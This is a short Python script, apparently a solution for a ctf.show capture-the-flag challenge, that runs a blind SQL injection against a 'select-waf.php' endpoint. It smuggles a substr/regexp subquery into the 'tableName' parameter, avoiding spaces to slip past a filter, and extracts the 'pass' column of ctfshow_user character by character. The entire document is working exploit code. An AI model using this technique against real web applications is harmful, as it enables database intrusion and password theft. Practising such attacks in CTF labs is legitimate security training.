import requests

url = 'http://78e4e1ea-08f2-41b4-9219-aeba70a94d0d.chall.ctf.show/select-waf.php'
flagstr = r"{flqazwsxedcrvtgbyhnujmikolp-0123456789}"
res = ""
for i in range(1, 46):
    for j in flagstr:
        data = {
            'tableName': f"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')"
        }
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 1;") > 0:
            res += j
            print(data)
            print(res)
            break

